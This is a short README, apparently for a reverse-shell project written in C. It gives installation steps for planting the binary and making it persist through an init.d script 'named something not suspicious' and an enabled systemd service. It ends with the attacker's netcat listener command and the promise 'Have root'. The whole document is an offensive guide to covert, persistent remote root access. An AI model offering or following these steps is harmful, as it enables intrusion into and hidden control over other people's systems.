# reverse-shell
## DO NOT RUN THIS ON YOUR OWN COMPUTER UNLESS YOU WANT TO BE PWNED
A reverse shell written in c

## Installation and activation
First, download this in the / directory, compile a binary, then mv a.out /
Second, create a .sh file in /etc/init.d/ and name it something not suspicious
Then, in /etc/systemd/system create a .service file (example included)
$systemctl enable foo.service

## On the attacking box
$nc -nvlp 4444
Wait for connection to pop
Have root

